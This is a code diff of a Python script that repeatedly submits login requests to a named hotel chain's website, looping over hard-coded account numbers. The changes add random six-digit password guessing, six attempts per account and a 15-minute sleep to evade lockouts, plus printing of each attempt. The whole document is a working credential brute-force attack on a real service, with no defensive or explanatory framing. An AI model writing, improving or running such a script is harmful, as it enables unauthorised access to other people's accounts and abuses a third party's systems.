@@ -6,7 +6,7 @@ import requests
 import json
 import time
 username_prefix = 8888000
-
+import random
 url = "http://www.kaiyuanhotels.com/web/index/login.htm"
 payload = {'userName':'0','password':'8888'}
 account_start = 888800052000
@@ -16,6 +16,7 @@ def auth_account(account, password ='8888', faield_test_again = True):
     payload = {'userName': '0', 'password': '8888'}
     dict.update(payload, userName= str(account))
     dict.update(payload,password = str(password))
+    print('尝试{}'.format(payload))
     payload.update()
     try:
         r = requests.get(url,payload)
@@ -50,11 +51,13 @@ def generateCount():
 def generate_func_args(start,end):
     return (start,end)
 if __name__ == '__main__':
+    password_str = ['0','1','2','3','4','5','6','7','8','9']
     accounts = ['888800051396','888800051171','888800051159']
     while True:
         for account in accounts:
             for i in range (6):
-                auth_account(account,)
+                password = random.sample(password_str,6)
+                auth_account(account, ''.join(password))
         print('睡眠中')
         time.sleep(60 * 15)
 
